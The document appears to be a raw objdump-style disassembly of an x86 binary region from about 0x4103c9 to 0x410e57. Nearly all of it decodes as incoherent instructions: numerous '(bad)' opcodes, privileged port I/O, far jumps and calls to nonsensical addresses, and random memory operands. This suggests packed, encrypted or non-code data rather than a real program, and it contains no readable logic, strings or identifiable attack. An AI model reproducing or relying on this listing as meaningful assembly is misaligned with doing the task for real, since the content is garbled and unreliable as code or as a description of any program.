  4103c9:	test   al,0x6a
  4103cb:	das    
  4103cc:	or     al,0x5b
  4103ce:	mov    ah,0xf9
  4103d0:	stos   DWORD PTR es:[edi],eax
  4103d1:	pop    edx
  4103d2:	out    0x3,eax
  4103d4:	sbb    al,0xb0
  4103d6:	and    dl,al
  4103d8:	cvtdq2ps xmm4,XMMWORD PTR [esi]
  4103db:	aas    
  4103dc:	sub    al,0x84
  4103de:	cmp    DWORD PTR [ecx-0x28],edi
  4103e1:	push   0x1e
  4103e3:	out    0x7f,eax
  4103e5:	loope  0x41038f
  4103e7:	add    eax,DWORD PTR [eax]
	...
  410411:	xchg   ebp,eax
  410412:	xchg   esi,eax
  410413:	neg    DWORD PTR [ecx]
  410415:	sbb    al,0x50
  410417:	jne    0x4103cc
  410419:	xor    al,dh
  41041b:	fistp  WORD PTR [ebx-0x53114a88]
  410421:	sahf   
  410422:	into   
  410423:	test   DWORD PTR [ebx],0x3515f91
  410429:	xchg   BYTE PTR [edi+0x431436d6],dh
  41042f:	jae    0x41047a
  410431:	add    edx,DWORD PTR [eax-0x39]
  410434:	adc    BYTE PTR ss:[eax+0x35],dl
  410438:	cld    
  410439:	sti    
  41043a:	dec    esp
  41043b:	adc    eax,0x24e1eaad
  410440:	mov    al,0xe2
  410442:	(bad)  
  410445:	push   eax
  410446:	arpl   WORD PTR [edi-0x68af8f8c],cx
  41044c:	lods   al,BYTE PTR ds:[esi]
  41044d:	push   eax
  41044e:	mov    ?,WORD PTR ds:0x4314
  410453:	push   esp
  410454:	dec    esi
  410455:	mov    ebx,0xb446714f
  41045a:	dec    edi
  41045b:	add    esp,edi
  41045d:	adc    edx,DWORD PTR [eax+0x74]
  410460:	loope  0x4103e9
  410462:	in     eax,dx
  410463:	pop    ebx
  410464:	enterw 0x7450,0xf5
  410469:	rol    dh,0x8
  41046c:	inc    ecx
  41046d:	pop    edi
  41046e:	scas   al,BYTE PTR es:[edi]
  41046f:	std    
  410470:	dec    esi
  410471:	add    al,0x97
  410473:	adc    al,0x6a
	...
  41049d:	add    BYTE PTR [edi-0x63128db1],al
  4104a3:	into   
  4104a4:	cld    
  4104a5:	in     al,0x33
  4104a7:	pop    esi
  4104a8:	sub    DWORD PTR [ebx+esi*4+0x74ee7456],0x5d305e0f
  4104b3:	imul   eax,DWORD PTR [eax],0x48
  4104b6:	ret    
  4104b7:	fnstsw WORD PTR [edi]
  4104b9:	jmp    0xac793c2c
  4104be:	xchg   ebp,eax
  4104c0:	add    eax,0xc7b05fd2
  4104c5:	sub    edx,DWORD PTR [ebx]
  4104c7:	pop    ebx
  4104c8:	sub    DWORD PTR [ebx+esi*2+0x56],0xc7c6f773
  4104d0:	adc    al,0xde
  4104d2:	dec    ebp
  4104d3:	arpl   ax,bp
  4104d5:	add    DWORD PTR [ebp+0x4e],edx
  4104d8:	(bad)  
  4104d9:	pusha  
  4104da:	pop    ebp
  4104db:	and    ebp,DWORD PTR [ecx-0x17]
  4104de:	pop    ds
  4104df:	pop    esp
  4104e0:	add    cl,dl
  4104e2:	sahf   
  4104e3:	mov    esp,0x9769b6fd
  4104e8:	hlt    
  4104e9:	add    dh,BYTE PTR [edi+0xda61341]
  4104ef:	addr16 std 
  4104f1:	adc    al,0xd0
  4104f3:	ss xor al,0x34
  4104f6:	ja     0x410545
  4104f8:	mov    dh,BYTE PTR [esp+ecx*4]
  4104fb:	jecxz  0x410501
  4104fd:	add    BYTE PTR [edi-0x66],bl
  410500:	cmp    DWORD PTR [ebp+0x0],edi
	...
  41052b:	popf   
  41052c:	test   edi,esp
  41052e:	mov    edi,eax
  410530:	push   0xffffff81
  410532:	cmp    BYTE PTR [ebp+0x78ff0d8b],dh
  410538:	(bad)  
  410539:	in     eax,0x41
  41053b:	addr16 add edi,edi
  41053e:	sub    esi,DWORD PTR ds:0x89c2c7a2
  410544:	pop    edx
  410545:	cmp    DWORD PTR [ebp-0x1f],0x9a850d5b
  41054c:	push   edi
  41054d:	add    BYTE PTR [eax],al
  41054f:	push   ds
  410550:	add    ch,bl
  410552:	outs   dx,BYTE PTR ds:[esi]
  410553:	(bad)  
  410554:	stos   DWORD PTR es:[edi],eax
  410555:	hlt    
  410556:	mov    ecx,DWORD PTR [ecx-0x40]
  410559:	add    al,BYTE PTR [ebp+0x35]
  41055c:	ins    DWORD PTR es:[edi],dx
  41055d:	add    BYTE PTR [eax+0x32],dl
  410560:	mov    WORD PTR [eax],cs
  410562:	call   0x3ea555
  410567:	and    cl,BYTE PTR [esp+edx*1-0x19ae5701]
  41056e:	mov    ecx,0x89ff0191
  410573:	js     0x41057b
  410575:	push   0x148b0200
  41057a:	jmp    FWORD PTR [eax+0x4f]
  41057d:	out    0x49,al
  41057f:	in     eax,dx
  410580:	add    bh,bh
  410582:	mov    esp,DWORD PTR [eax]
  410584:	imul   eax,DWORD PTR [ecx+0xd8b0539],0xffffffff
  41058b:	sub    BYTE PTR [ebx],cl
  41058d:	out    0xed,al
	...
  4105b7:	add    BYTE PTR [edx+eax*1-0x1],dl
  4105bb:	sub    esi,DWORD PTR [ebp-0x263d3860]
  4105c1:	pop    ecx
  4105c2:	std    
  4105c3:	jne    0x4105e2
  4105c5:	add    dh,BYTE PTR [ebp+0x14]
  4105c8:	sbb    al,0xe5
  4105ca:	xor    ah,cl
  4105cc:	ret    
  4105cd:	data16 clc 
  4105cf:	(bad)  
  4105d0:	xor    DWORD PTR [edx+ebx*4-0x6e],ecx
  4105d4:	mov    dl,0xcc
  4105d6:	stos   BYTE PTR es:[edi],al
  4105d7:	or     bl,ah
  4105d9:	dec    esi
  4105da:	sti    
  4105db:	(bad)  
  4105dc:	sub    eax,ecx
  4105de:	cdq    
  4105df:	(bad)  
  4105e2:	stos   BYTE PTR es:[edi],al
  4105e3:	sub    bl,BYTE PTR [esp+ecx*1-0x43]
  4105e7:	shl    DWORD PTR [eax],0x44
  4105ea:	inc    ebx
  4105eb:	cmp    eax,DWORD PTR [ecx]
  4105ed:	lods   al,BYTE PTR ds:[esi]
  4105ee:	xor    ecx,DWORD PTR [ebp-0xf5f185]
  4105f4:	jmp    0x54b5b120
  4105f9:	test   BYTE PTR [eax],dh
  4105fb:	or     al,0x63
  4105fd:	push   es
  4105fe:	cli    
  4105ff:	out    0xc2,eax
  410601:	jne    0x4105ad
  410603:	(bad)  
  410604:	daa    
  410605:	test   dl,bh
  410607:	test   dh,ch
  410609:	inc    edx
  41060a:	add    al,BYTE PTR [eax]
  41060c:	inc    ebx
  41060d:	out    0xad,al
  41060f:	out    0x91,eax
  410611:	loop   0x4105bd
  410613:	inc    BYTE PTR [edi]
  410615:	test   BYTE PTR [edx-0x37],cl
  410618:	pop    esi
  410619:	das    
  41061a:	add    ch,cl
	...
  410644:	add    dl,ah
  410646:	inc    edx
  410647:	add    al,BYTE PTR [eax]
  410649:	lahf   
  41064a:	mov    bh,0xa8
  41064c:	or     al,0x23
  41064e:	mov    bh,0xf0
  410650:	add    BYTE PTR [edx+eax*2],bl
  410653:	(bad)  
  410655:	cmc    
  410656:	push   esi
  410657:	add    DWORD PTR [eax],eax
  410659:	sbb    al,0xc9
  41065b:	dec    ebp
  41065c:	hlt    
  41065d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41065e:	ss ins BYTE PTR es:[edi],dx
  410660:	add    ah,BYTE PTR [ecx+0x12]
  410663:	pop    ds
  410664:	add    BYTE PTR [ebp+edi*8+0x2d],cl
  410668:	or     ah,al
  41066a:	pop    ebx
  41066b:	out    dx,al
  41066c:	dec    edx
  41066d:	ror    DWORD PTR [edx+edx*1+0x4],cl
  410671:	retf   
  410672:	(bad)  
  410673:	sti    
  410674:	test   al,0x48
  410676:	arpl   WORD PTR [edi+0x65],di
  410679:	mov    dl,0x4c
  41067b:	xchg   DWORD PTR [ebp+0x60],edi
  41067e:	addr16 push 0xffffffeb
  410681:	stos   DWORD PTR es:[edi],eax
  410682:	(bad)  
  410683:	out    0xa8,al
  410685:	sub    BYTE PTR [edi-0x80],al
  410688:	inc    ecx
  410689:	std    
  41068a:	dec    ebx
  41068b:	addr16 fst st(3)
  41068e:	lods   al,BYTE PTR ds:[esi]
  41068f:	xor    dh,al
  410691:	das    
  410692:	pop    ebx
  410693:	loop   0x41066a
  410695:	orps   xmm0,XMMWORD PTR [eax-0x68]
  410699:	jnp    0x4106e7
  41069b:	call   0xd27fdf1a
  4106a0:	add    ebp,DWORD PTR [ebx-0x3a]
  4106a3:	fld    TBYTE PTR [eax+0x353f62e8]
	...
  4106d1:	add    BYTE PTR [ebx+0x4c],dl
  4106d4:	daa    
  4106d5:	jge    0x4106b7
  4106d7:	pushw  0xffeb
  4106da:	dec    ebx
  4106db:	(bad)  
  4106dc:	out    0xa8,al
  4106de:	enter  0x46,0x11
  4106e2:	mov    ebp,0x73dd074b
  4106e7:	lods   al,BYTE PTR ds:[esi]
  4106e8:	xor    dh,al
  4106ea:	cvtdq2ps xmm6,xmm6
  4106ed:	out    dx,al
  4106ee:	jg     0x4106cd
  4106f0:	test   al,0x3
  4106f2:	stos   DWORD PTR es:[edi],eax
  4106f3:	xchg   ebp,eax
  4106f4:	iret   
  4106f5:	jl     0x41074f
  4106f7:	inc    ebx
  4106f8:	imul   ebx,DWORD PTR [ebx-0x137e5e9],0x36
  4106ff:	sub    DWORD PTR [ecx-0x17b40458],edx
  410705:	mov    al,0xec
  410707:	xlat   BYTE PTR ds:[ebx]
  410708:	iret   
  410709:	adc    BYTE PTR [ebp-0x6736ff6b],dl
  41070f:	mov    esi,0x97590ae8
  410714:	in     al,dx
  410715:	loop   0x410729
  410717:	inc    ebx
  410718:	jbe    0x410705
  41071a:	test   al,0x82
  41071c:	sub    DWORD PTR [ebx-0x3d1368c0],edi
  410722:	cli    
  410723:	cmp    cl,BYTE PTR [edx-0x40276fcc]
  410729:	retf   0x42a0
  41072c:	add    eax,0x53586e7e
  410731:	mov    DWORD PTR [esi],edx
  410733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410734:	in     al,0x72
	...
  41075e:	add    BYTE PTR [edx+0x43],dl
  410761:	cmp    ah,BYTE PTR [ebx+ebp*4+0x426203c8]
  410768:	cmp    ebp,edx
  41076a:	jmp    0x6742:0x46e496f8
  410771:	std    
  410772:	mov    ah,0x93
  410774:	fwait
  410775:	std    
  410776:	mov    esp,0x36a03367
  41077b:	test   BYTE PTR [edx+ecx*1+0x29],cl
  41077f:	add    bl,BYTE PTR [ebp+edi*8-0x6c]
  410783:	jnp    0x4107b8
  410785:	pushf  
  410786:	mov    DWORD PTR [esp+ecx*2+0x2a],esi
  41078a:	sub    esp,esp
  41078c:	and    ebx,eax
  41078e:	fstp   QWORD PTR [edi]
  410790:	loop   0x4107d5
  410792:	sbb    eax,0xac8c1ba8
  410797:	push   ebx
  410798:	fwait
  410799:	mov    esp,DWORD PTR [edi+eiz*8-0x592ead66]
  4107a0:	inc    ebp
  4107a1:	(bad)  
  4107a2:	fimul  WORD PTR [ecx+0x4dd6d09f]
  4107a8:	daa    
  4107a9:	jmp    0xfe8b7384
  4107ae:	add    BYTE PTR [esi+0x3100d074],al
  4107b4:	push   esp
  4107b5:	cmp    DWORD PTR [ebp-0x73],0x8a17745f
  4107bc:	mov    esp,ss
  4107be:	push   DWORD PTR [eax]
  4107c0:	pop    ss
  4107c1:	push   DWORD PTR [ebp+0x0]
	...
  4107ec:	mov    ecx,0xaa087501
  4107f1:	lods   al,BYTE PTR ds:[esi]
  4107f2:	sbb    bh,bh
  4107f4:	adc    BYTE PTR [edi],dl
  4107f6:	out    0x2,al
  4107f8:	sahf   
  4107f9:	add    bh,bh
  4107fb:	inc    edi
  4107fc:	fidiv  WORD PTR [ebx-0x8]
  4107ff:	getsec 
  410801:	cs cld 
  410803:	dec    DWORD PTR [edx]
  410805:	add    dh,BYTE PTR [ebp-0xc]
  410808:	in     eax,dx
  410809:	popf   
  41080a:	pusha  
  41080b:	(bad)  
  41080c:	jmp    0x5d5e:0x750000b6
  410813:	leave  
  410814:	inc    edi
  410815:	imul   eax,DWORD PTR [eax],0x55
  410818:	out    dx,al
  410819:	loop   0x410871
  41081b:	push   DWORD PTR [eax+0x5bd2e646]
  410821:	add    edi,edi
  410823:	push   0x3f7b42
  410828:	cli    
  410829:	mov    ecx,DWORD PTR [eax]
  41082b:	call   0x418b01
  410830:	ds push ds
  410832:	jne    0x410839
  410834:	mov    al,BYTE PTR [edi]
  410836:	ror    BYTE PTR [eax],0x45
  410839:	or     dh,bh
  41083b:	jmp    FWORD PTR [edx]
  41083d:	mov    ecx,DWORD PTR [eax]
  41083f:	call   0x3e7928
  410844:	dec    edx
  410845:	dec    eax
  410846:	gs inc ecx
  410848:	add    eax,0x52087501
  41084d:	out    0x73,eax
  41084f:	dec    ebx
	...
  410878:	add    BYTE PTR [esp+esi*1],bl
  41087b:	add    cl,BYTE PTR [ebx]
  41087d:	fsubr  QWORD PTR [esi-0xa1aa101]
  410883:	stc    
  410884:	jmp    edi
  410886:	inc    esp
  410887:	ret    0xe3b8
  41088a:	adc    BYTE PTR [edi-0x16363102],ah
  410890:	push   es
  410891:	dec    ecx
  410892:	aam    0xa6
  410894:	je     0x4108aa
  410896:	in     al,dx
  410897:	jo     0x4108e2
  410899:	sbb    al,0x34
  41089b:	sti    
  41089c:	mov    edi,0xc9473f31
  4108a1:	fimul  WORD PTR [ebx+0x2]
  4108a4:	push   0x435ee5
  4108a9:	mov    ds:0xdde7fa46,eax
  4108ae:	jl     0x4108b4
  4108b0:	add    BYTE PTR [edi],ah
  4108b2:	je     0x4108e4
  4108b4:	or     DWORD PTR [ebx+0x198ef62e],ecx
  4108ba:	loopne 0x41092f
  4108bc:	inc    eax
  4108bd:	sbb    al,0x1c
  4108bf:	ds fnsave gs:[ebx]
  4108c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c4:	je     0x4108da
  4108c6:	lods   al,BYTE PTR ds:[esi]
  4108c7:	fimul  WORD PTR [edx+0x1c]
  4108ca:	xor    al,0xfb
  4108cc:	mov    edi,0x74a73ad1
  4108d1:	and    cl,dl
  4108d3:	add    BYTE PTR [eax+0x6801f29a],dh
  4108d9:	out    dx,eax
  4108da:	(bad)  
  4108db:	inc    esp
	...
  410904:	add    BYTE PTR [eax],al
  410906:	cmp    ebp,esi
  410908:	stc    
  410909:	out    0x21,eax
  41090b:	or     eax,0x74170002
  410910:	xor    BYTE PTR [ecx],cl
  410912:	and    eax,esi
  410914:	cmc    
  410915:	mov    fs,WORD PTR [ecx]
  410917:	mov    ?,WORD PTR [ebx+0x40]
  41091a:	sbb    al,0x5b
  41091c:	lahf   
  41091d:	add    ebx,DWORD PTR [ebx+ebx*2]
  410920:	out    0x44,eax
  410922:	aad    0x1d
  410924:	loopne 0x410929
  410926:	push   ecx
  410927:	aam    0xbb
  410929:	sbb    edi,0x744d1e4f
  41092f:	pop    esp
  410930:	inc    esp
  410931:	inc    ebx
  410932:	sbb    al,0x48
  410934:	cmp    eax,0x2326c3fc
  410939:	add    al,0x1c
  41093b:	push   esp
  41093c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41093d:	das    
  41093e:	and    ch,BYTE PTR [eax+0x5fddbb3d]
  410944:	out    0x43,eax
  410946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410947:	dec    ebx
  410948:	arpl   WORD PTR [edi],sp
  41094a:	and    al,0x34
  41094c:	jmp    0xe7ca34b0
  410951:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410953:	(bad)  
  410954:	(bad)  
  410955:	inc    BYTE PTR [eax]
  410957:	call   0x6d4f:0x5308a4e7
  41095e:	(bad)  
  41095f:	pop    edx
  410960:	out    0xf8,eax
  410962:	ret    
  410963:	into   
  410964:	in     eax,dx
  410965:	inc    esp
  410966:	ficom  DWORD PTR [ecx]
  410968:	sub    al,BYTE PTR [eax]
	...
  410992:	add    BYTE PTR [esp+edx*8],bl
  410995:	(bad)  
  410996:	sti    
  410997:	jbe    0x410a16
  410999:	addr16 in eax,0x14
  41099c:	iret   
  41099d:	rol    BYTE PTR [ebx+0xfb3561a],1
  4109a3:	pushf  
  4109a4:	mov    cl,dh
  4109a6:	das    
  4109a7:	sbb    ebx,ebx
  4109a9:	fimul  WORD PTR [eax-0x38]
  4109ac:	push   esp
  4109ad:	addr16 in eax,0xd8
  4109b0:	into   
  4109b1:	in     al,0x83
  4109b3:	repnz mov edx,0x6062007c
  4109b9:	(bad)  
  4109ba:	cmp    al,0x9c
  4109bc:	mov    BYTE PTR [eax],al
  4109be:	jmp    0xa5072c0d
  4109c3:	mov    ebx,0x1fe9fe47
  4109c8:	and    BYTE PTR [ecx+eiz*8+0x1f],al
  4109cc:	pop    ebx
  4109cd:	add    cl,ch
  4109cf:	je     0x410998
  4109d1:	or     dl,al
  4109d3:	xor    al,0xdb
  4109d5:	cmp    eax,0x81743b0e
  4109da:	cmp    al,0xb4
  4109dc:	inc    edi
  4109dd:	jne    0x4109ba
  4109df:	mov    BYTE PTR [esi+0x5b1fe8f8],bl
  4109e5:	add    BYTE PTR [esp+edx*1],bl
  4109e8:	and    BYTE PTR [ebp+ebx*4+0x1e],al
  4109ec:	pop    ebx
  4109ed:	add    cl,ch
  4109ef:	xchg   esp,eax
  4109f0:	ins    BYTE PTR es:[edi],dx
  4109f1:	cmc    
  4109f2:	and    al,0x80
  4109f4:	pop    edx
  4109f5:	add    cl,ch
	...
  410a1f:	add    BYTE PTR [edi],bl
  410a21:	into   
  410a22:	or     ah,BYTE PTR [edi+0x2cc567a0]
  410a28:	les    eax,FWORD PTR [edi-0x2]
  410a2b:	jmp    0xc57ee54f
  410a30:	cmp    bl,BYTE PTR [esi-0x3]
  410a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a34:	mov    bh,0x34
  410a36:	push   es
  410a37:	cmp    al,BYTE PTR cs:[ebx+0x1]
  410a3b:	jmp    0xc4c2655f
  410a40:	ret    
  410a41:	pop    edx
  410a42:	jae    0x410a2e
  410a44:	mov    eax,ds:0x9fae2060
  410a49:	mov    BYTE PTR [eax],al
  410a4b:	mov    ah,0xcf
  410a4d:	aam    0x7b
  410a4f:	icebp  
  410a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a51:	arpl   WORD PTR [eax+0x16ce3fde],ax
  410a57:	imul   eax,DWORD PTR [eax],0xf94205a
  410a5d:	mov    al,0xe9
  410a5f:	add    BYTE PTR [ebx],bh
  410a61:	rol    DWORD PTR [esi+0x1],0xad
  410a65:	inc    esi
  410a66:	inc    edi
  410a67:	adc    dl,0x5a
  410a6a:	jae    0x410a61
  410a6c:	mov    ds:0x4280458f,al
  410a71:	pop    edi
  410a72:	jae    0x410a53
  410a74:	mov    edx,0x500f494
  410a79:	pop    ebx
  410a7a:	add    BYTE PTR [ebx+0x7d895748],cl
  410a80:	in     eax,dx
  410a81:	cmc    
  410a82:	pop    ds
  410a83:	add    BYTE PTR [eax],0x0
	...
  410aaa:	add    BYTE PTR [eax],al
  410aac:	add    dl,ah
  410aae:	ss jne 0x410acd
  410ab1:	mov    edx,DWORD PTR [edx+0x0]
  410ab4:	dec    DWORD PTR [eax]
  410ab6:	jecxz  0x410b0b
  410ab8:	call   0x4007ab
  410abd:	into   
  410abe:	sbb    dh,BYTE PTR [ebp+0x6]
  410ac1:	repnz cwde 
  410ac3:	mov    edx,0xf7895ab9
  410ac9:	sti    
  410aca:	stc    
  410acb:	inc    esp
  410acc:	hlt    
  410acd:	cli    
  410ace:	fidivr WORD PTR [esi]
  410ad0:	add    BYTE PTR [eax+0x975ff07],bl
  410ad6:	sub    eax,0xfefa030c
  410adc:	pop    edi
  410add:	ret    
  410ade:	pop    ss
  410adf:	rol    BYTE PTR [eax*4+0x6ec8983],0x13
  410ae7:	(bad)  
  410ae8:	push   esi
  410ae9:	mov    bl,ch
  410aeb:	jl     0x410b01
  410aed:	jne    0x410b5d
  410aef:	pop    es
  410af0:	adc    DWORD PTR [eax-0x5b],0x4a
  410af4:	inc    ecx
  410af5:	inc    ebp
  410af6:	pop    edx
  410af7:	jae    0x410aff
  410af9:	bound  ebx,QWORD PTR [edi+eax*8-0x76a5ba3e]
  410b00:	inc    ebp
  410b01:	sbb    al,0x48
  410b03:	fld    QWORD PTR [eax+eax*4]
  410b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b07:	inc    ebx
  410b08:	add    BYTE PTR [ebx],bl
  410b0a:	mov    cl,0x65
  410b0c:	add    BYTE PTR [esp+esi*1],bl
  410b0f:	fld    QWORD PTR [eax+eax*1]
	...
  410b3a:	int3   
  410b3b:	mov    ebp,0xb1230043
  410b40:	jns    0x410b42
  410b42:	sbb    al,0x34
  410b44:	fld    QWORD PTR [eax+ecx*8]
  410b47:	mov    ch,0x44
  410b49:	add    BYTE PTR [ebx],ch
  410b4b:	mov    cl,0x8e
  410b4d:	add    BYTE PTR [esp+esi*1],bl
  410b50:	xchg   ecx,eax
  410b51:	inc    esp
  410b52:	lock arpl WORD PTR [edi-0x709c1bbc],cx
  410b59:	inc    esp
  410b5a:	fsub   DWORD PTR [ebx-0x5f]
  410b5d:	xor    al,0x80
  410b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b60:	inc    esp
  410b61:	add    bl,cl
  410b63:	data16 hlt 
  410b65:	out    0x82,eax
  410b67:	sti    
  410b68:	mov    ds:0xac76a9fe,al
  410b6d:	dec    edi
  410b6e:	mov    eax,ds:0x994fb07e
  410b73:	jbe    0x410b09
  410b75:	dec    edi
  410b76:	mov    ds:0xdd8d560e,eax
  410b7b:	xor    esp,DWORD PTR [ebx+0x65dc2c74]
  410b81:	test   DWORD PTR [ebx+0x604490bc],0x7c449103
  410b8b:	add    edx,DWORD PTR [ecx-0x5cfc87bc]
  410b91:	xor    al,0xac
  410b93:	int    0x44
  410b95:	add    BYTE PTR [ebx+0xe],ah
  410b98:	repnz out 0xa6,eax
  410b9b:	mov    esp,DWORD PTR [edx+0xfe]
	...
  410bc5:	add    BYTE PTR [eax],al
  410bc7:	push   ebx
  410bc8:	push   cs
  410bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bca:	mov    fs,ecx
  410bcc:	pop    edx
  410bcd:	cmp    esp,DWORD PTR [edx+0x486f26c8]
  410bd3:	push   esp
  410bd4:	sbb    eax,0x4533b3ad
  410bd9:	call   0x33e0a4e1
  410bde:	xor    esi,DWORD PTR [esi-0x79fc6ea5]
  410be4:	pop    ebx
  410be5:	add    DWORD PTR [ebx],0x485c5b86
  410beb:	lock stos DWORD PTR es:[edi],eax
  410bed:	out    0xf7,al
  410bef:	(bad)  
  410bf0:	nop
  410bf1:	sub    BYTE PTR [edi+eiz*1],al
  410bf4:	sbb    esp,edi
  410bf6:	xchg   DWORD PTR ds:0x9f03e75a,esp
  410bfc:	(bad)  
  410bfd:	xchg   edi,eax
  410bfe:	add    al,0x13
  410c00:	(bad)  
  410c02:	add    bl,BYTE PTR [ebx+ebx*2]
  410c05:	bound  ecx,QWORD PTR [edi-0x20]
  410c08:	sbb    BYTE PTR [eax+ebp*4],0x1a
  410c0c:	fcomp  QWORD PTR [ebx-0x64a4e3fc]
  410c12:	lea    esi,[eax]
  410c14:	sub    esp,DWORD PTR [ebx+0x1f]
  410c17:	rcl    al,1
  410c19:	sbb    al,0xd0
  410c1b:	mov    esi,0xa2687a59
  410c20:	into   
  410c21:	stos   DWORD PTR es:[edi],eax
  410c22:	xchg   ecx,eax
  410c23:	loopne 0x410c63
  410c25:	ja     0x410c3e
  410c27:	ins    BYTE PTR es:[edi],dx
  410c28:	xor    edi,DWORD PTR [eax+0x4b]
	...
  410c52:	add    BYTE PTR [eax],al
  410c54:	sbb    al,0x5b
  410c56:	push   0x1f
  410c58:	sbb    BYTE PTR [ebx-0x12],0x87
  410c5c:	imul   ebx,DWORD PTR [ebx-0x19],0x57c69f03
  410c63:	add    al,0x1b
  410c65:	fild   QWORD PTR [ebx]
  410c67:	add    al,0x1c
  410c69:	pop    ebx
  410c6a:	push   0x1f
  410c6c:	inc    eax
  410c6d:	pop    ebx
  410c6e:	add    dh,ah
  410c70:	fwait
  410c71:	add    al,BYTE PTR [ecx]
  410c73:	jmp    0x25b55097
  410c78:	jo     0x410bfd
  410c7a:	pop    ebx
  410c7b:	push   ds
  410c7c:	jge    0x410c51
  410c7e:	inc    ebx
  410c7f:	and    DWORD PTR [ebp-0x31],edi
  410c82:	cld    
  410c83:	push   cs
  410c84:	adc    edx,DWORD PTR [ebx]
  410c86:	(bad)  
  410c87:	jl     0x410c14
  410c89:	cmp    al,0x5e
  410c8b:	pushf  
  410c8c:	mov    esp,0x3a8b6944
  410c91:	call   0xe900:0x9ccb0100
  410c98:	dec    edi
  410c99:	mov    bl,0x62
  410c9b:	inc    esp
  410c9c:	pop    edi
  410c9d:	pop    ebx
  410c9e:	std    
  410c9f:	pop    esp
  410ca0:	loopne 0x410cdd
  410ca2:	test   BYTE PTR [eax],ah
  410ca4:	and    BYTE PTR [ebx+0x9],bl
  410ca7:	test   eax,0x5068630b
  410cac:	add    ebx,DWORD PTR [edx-0x63213f00]
  410cb2:	add    cl,ch
  410cb4:	btr    DWORD PTR [edi+0xc],esp
	...
  410ce0:	add    BYTE PTR [edi+0x5b],bl
  410ce3:	std    
  410ce4:	adc    al,0xe8
  410ce6:	cmp    ebp,DWORD PTR [eax+0x20]
  410ce9:	sbb    BYTE PTR [ebx+0x9],bl
  410cec:	test   eax,0xf8686313
  410cf1:	cli    
  410cf2:	cdq    
  410cf3:	add    BYTE PTR [ecx-0x16ff62fe],dl
  410cf9:	dec    edi
  410cfa:	mov    bl,0x6f
  410cfc:	add    al,0xdf
  410cfe:	pop    edx
  410cff:	std    
  410d00:	fcom   QWORD PTR [edi+0x3b]
  410d03:	dec    esp
  410d04:	mov    al,0x1f
  410d06:	pop    ebx
  410d07:	or     DWORD PTR [ecx],ebp
  410d09:	or     bl,BYTE PTR [esi+0x341fe968]
  410d0f:	mov    edi,0xc6cda00
  410d14:	call   0x3e8d7d
  410d19:	or     ch,BYTE PTR ds:0x57748ea6
  410d1f:	std    
  410d20:	jne    0x410d6b
  410d22:	out    dx,eax
  410d23:	push   edx
  410d24:	pop    ecx
  410d25:	sbb    bh,bl
  410d27:	(bad)  
  410d28:	jne    0x410d33
  410d2a:	sti    
  410d2b:	je     0x410d21
  410d2d:	sbb    ch,BYTE PTR [ebp+0xc]
  410d30:	call   0x3e8dd3
  410d35:	sbb    ch,BYTE PTR [ecx-0x10]
  410d38:	call   DWORD PTR [eax-0x168a010a]
  410d3e:	imul   BYTE PTR [ecx+ebx*2-0x6]
  410d42:	loop   0x410d42
  410d44:	jne    0x410d46
	...
  410d6e:	loope  0x410d52
  410d70:	je     0x410d4e
  410d72:	retf   0xc64
  410d75:	call   0x3e8db4
  410d7a:	fisub  DWORD PTR [eax+ecx*8-0x18]
  410d7e:	adc    eax,0x2afffd9b
  410d83:	add    edi,0x535ee5c2
  410d89:	mov    ebp,DWORD PTR [ecx+0x46e8c1de]
  410d8f:	jl     0x410da5
  410d91:	add    eax,0x112d3ba
  410d96:	mov    ch,0x5e
  410d98:	mov    eax,DWORD PTR [ebp+0x21]
  410d9b:	xchg   DWORD PTR [ebx-0x747862bb],ecx
  410da1:	inc    ebp
  410da2:	or     DWORD PTR [edi+0x63fa026a],eax
  410da8:	adc    al,ch
  410daa:	adc    al,0xea
  410dac:	(bad)  
  410dad:	inc    DWORD PTR [esi]
  410daf:	jl     0x410da9
  410db1:	add    DWORD PTR [ecx+edi*1],ebx
  410db4:	mov    edx,esi
  410db6:	sbb    al,0x34
  410db8:	add    bh,bh
  410dba:	jmp    0x4c859b3e
  410dbf:	sub    al,0xd0
  410dc1:	fnsave fs:[ebx]
  410dc4:	lahf   
  410dc5:	je     0x410e13
  410dc7:	pushf  
  410dc8:	jge    0x410e10
  410dca:	sbb    al,0x34
  410dcc:	or     eax,eax
  410dce:	sub    esi,DWORD PTR [edi+0xffbc]
	...
  410df8:	add    BYTE PTR [eax],al
  410dfa:	add    BYTE PTR [ebx],dh
  410dfc:	xor    al,0x91
  410dfe:	inc    esp
  410dff:	xor    BYTE PTR [ecx+edx*4],al
  410e02:	inc    esp
  410e03:	and    al,0xe4
  410e05:	nop
  410e06:	inc    esp
  410e07:	sbb    ah,ah
  410e09:	daa    
  410e0a:	add    BYTE PTR [ebx],dl
  410e0c:	mov    edi,0x4a02e7f1
  410e11:	lahf   
  410e12:	(bad)  
  410e13:	lahf   
  410e14:	mov    dh,0x9c
  410e16:	add    BYTE PTR [ebx],ch
  410e18:	mov    bh,0x59
  410e1a:	push   ebx
  410e1c:	xor    ebx,DWORD PTR [edi-0x60640f8c]
  410e22:	arpl   WORD PTR [ebp+0x34],bx
  410e25:	stos   BYTE PTR es:[edi],al
  410e26:	inc    ebp
  410e27:	arpl   WORD PTR [edx+eax*1],si
  410e2a:	or     ebx,esp
  410e2c:	cmp    BYTE PTR [ecx+0x2341ca2],cl
  410e32:	lea    ebx,[ecx-0x20]
  410e35:	xor    DWORD PTR [ebp-0x72ce039f],ecx
  410e3b:	pop    ecx
  410e3c:	call   0xd1607872
  410e41:	sbb    BYTE PTR [eax],dl
  410e43:	mov    ah,0x82
  410e45:	xchg   ebx,eax
  410e46:	(bad)  
  410e47:	fwait
  410e48:	mov    ah,0x20
  410e4a:	clc    
  410e4b:	sbb    al,0x39
  410e4d:	mov    DWORD PTR [edx-0x74fdcbe4],eax
  410e53:	fstp   DWORD PTR [edx+0x5b]
  410e56:	sahf   
  410e57:	dec    ebx
